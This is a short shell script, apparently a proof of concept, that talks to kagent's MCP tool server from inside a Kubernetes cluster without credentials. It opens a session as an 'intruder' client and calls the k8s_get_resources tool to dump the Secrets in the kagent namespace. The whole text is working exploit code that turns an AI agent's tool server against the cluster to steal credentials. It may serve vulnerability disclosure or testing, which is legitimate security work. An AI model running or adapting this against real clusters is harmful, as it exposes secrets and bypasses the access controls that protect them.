#!/bin/sh
# Plays any Pod in the cluster: talks to kagent's tool server directly, with no credentials,
# and asks it to list the Secrets in the kagent namespace.
apk add -q curl jq >/dev/null 2>&1
URL=http://kagent-tools.kagent:8084/mcp
H="content-type: application/json"
A="accept: application/json, text/event-stream"
SESSION=$(curl -s -D - -o /dev/null -H "$H" -H "$A" "$URL" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"intruder","version":"1"}}}' \
  | grep -i mcp-session-id | cut -d' ' -f2 | tr -d '\r')
curl -s -o /dev/null -H "$H" -H "$A" -H "mcp-session-id: $SESSION" "$URL" -d '{"jsonrpc":"2.0","method":"notifications/initialized"}'
curl -s -H "$H" -H "$A" -H "mcp-session-id: $SESSION" "$URL" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"k8s_get_resources","arguments":{"resource_type":"secrets","namespace":"kagent"}}}' \
  | sed 's/^data: //' | grep '^{' | jq -r '.result.content[0].text'
